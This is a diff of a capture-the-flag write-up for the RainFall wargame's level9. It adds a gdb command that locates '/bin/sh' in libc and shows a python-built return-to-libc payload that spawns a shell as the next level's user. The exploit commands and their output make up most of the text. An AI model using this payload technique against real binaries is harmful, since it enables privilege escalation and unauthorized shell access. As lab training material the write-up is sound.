@@ -32,7 +32,10 @@ $3 = {<text variable, no debug info>} 0xb7d79be0 <exit>
 Okay, nex step, we need to find the address of `/bin/sh`, a bit harder but don't worry we spare you researches:
 
 ```sh
-?????????
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7ea7c58
+warning: Unable to access target memory at 0xb7fd48e0, halting search.
+1 pattern found.
 ```
 Okay now we have all our address.
 
@@ -48,9 +51,9 @@ Okay no problem:
 
 ```sh
 level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "\xe0\x9b\xd7\xb7" + "\x58\x7c\xea\xb7" + "\x90" * 96 + "\x0c\xa0\x04\x08")')
-sh: 1: 
+sh: 1:
        : not found
-level9@RainFall:~$ 
+level9@RainFall:~$
 ```
 
 Something happened ...
@@ -70,9 +73,9 @@ And voila we are now log with bonus0
 
 ```sh
 level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "\xe0\x9b\xd7\xb7" + "\x58\x7c\xea\xb7" + "\x90" * 96 + "\x0c\xa0\x04\x08" + ";/bin/sh")')
-sh: 1: 
+sh: 1:
        : not found
 $ whoami
 bonus0
-$ 
+$
 ```
